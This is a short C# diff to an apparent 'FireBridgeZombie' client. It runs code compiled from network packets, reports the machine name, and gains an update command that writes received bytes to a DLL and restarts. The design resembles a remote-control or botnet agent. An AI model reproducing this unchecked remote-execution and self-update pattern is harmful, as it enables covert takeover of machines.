@@ -54,7 +54,7 @@ namespace FireBridgeZombie
 
                     var cls = results.CompiledAssembly.GetType(code.EntryPoint);
                     var method = cls.GetMethod("Main", BindingFlags.Static | BindingFlags.Public);  
-                    method.Invoke(null, new[] { s });
+                    method.Invoke(null, new[] { sender });
 
                     break;
                 case 2: //Restart
@@ -84,6 +84,14 @@ namespace FireBridgeZombie
                     break;
                 case 5: //Identification
                     connection.SendPacket(new Packet() { Id = 5, Data = Environment.MachineName });
+                    break;
+                case 6: //Update
+                    File.WriteAllBytes("FirebridgeShared.dll.new", (byte[])packet.Data);
+                    s.Stop();
+                    DiscoveryServer.Stop();
+                    Environment.ExitCode = 69;
+                    Application.Exit();
+                    s.Stop();
                     break;
                 default:
                     Console.WriteLine("Unknown Packet of " + packet.Id);
